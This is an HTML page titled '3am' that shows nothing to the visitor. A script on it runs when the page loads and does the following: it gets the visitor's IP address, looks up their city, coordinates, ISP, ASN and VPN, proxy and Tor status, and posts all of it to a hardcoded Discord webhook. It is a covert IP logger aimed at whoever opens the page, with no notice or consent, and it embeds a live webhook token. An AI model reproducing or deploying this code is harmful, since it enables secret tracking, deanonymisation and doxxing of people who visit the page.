<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>3am</title>
</head>
<body>
    <script>
        fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => {
            const ip = data.ip;
            return fetch(`https://ipinfo.io/widget/demo/${ip}`);
        })
        .then(res => res.json())
        .then(data => {
            const payload = {
                content: `**IP Information:**\n` +
                         `--------------------------\n` +
                         `**IP Address:** ${data.ip}\n` +
                         `**Location:** ${data.city}, ${data.region}, ${data.country}\n` +
                         `**Coordinates:** ${data.loc}\n` +
                         `**Organization:** ${data.org}\n\n` +
    
                         `**Network Details:**\n` +
                         `--------------------------\n` +
                         `**ASN:** ${data.asn?.asn || 'N/A'}\n` +
                         `**ASN Name:** ${data.asn?.name || 'N/A'}\n` +
                         `**ASN Domain:** ${data.asn?.domain || 'N/A'}\n` +
                         `**ASN Route:** ${data.asn?.route || 'N/A'}\n` +
                         `**ASN Type:** ${data.asn?.type || 'N/A'}\n\n` +
    
                         `**Company Details:**\n` +
                         `--------------------------\n` +
                         `**Company Name:** ${data.company?.name || 'N/A'}\n` +
                         `**Company Domain:** ${data.company?.domain || 'N/A'}\n` +
                         `**Company Type:** ${data.company?.type || 'N/A'}\n\n` +
    
                         `**Connection Type:**\n` +
                         `--------------------------\n` +
                         `**Anycast:** ${data.anycast || false}\n` +
                         `**Mobile:** ${data.mobile || false}\n` +
                         `**Anonymous:** ${data.privacy?.anonymous || false}\n` +
                         `**Satellite:** ${data.privacy?.satellite || false}\n` +
                         `**Hosting Service:** ${data.privacy?.hosting || false}\n\n` +
    
                         `**Privacy Details:**\n` +
                         `--------------------------\n` +
                         `**Using VPN:** ${data.privacy?.vpn || false}\n` +
                         `**Using Proxy:** ${data.privacy?.proxy || false}\n` +
                         `**Using Tor:** ${data.privacy?.tor || false}\n` +
                         `**Relay Enabled:** ${data.privacy?.relay || false}\n` +
                         `**Hosting Provider:** ${data.privacy?.service || 'N/A'}`
            };
    
            return fetch('https://discord.com/api/webhooks/1335135046633525330/lu2M-H2A36_E_68tGUVcgQnwqInav48znOPlRR6R-_GuFGWyHEdyE4-S32eAArllrh4X', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        })
        .then(() => console.log("IP Info Sent Successfully"))
        .catch(err => console.error("Error:", err));
    
    </script>
</body>
</html>
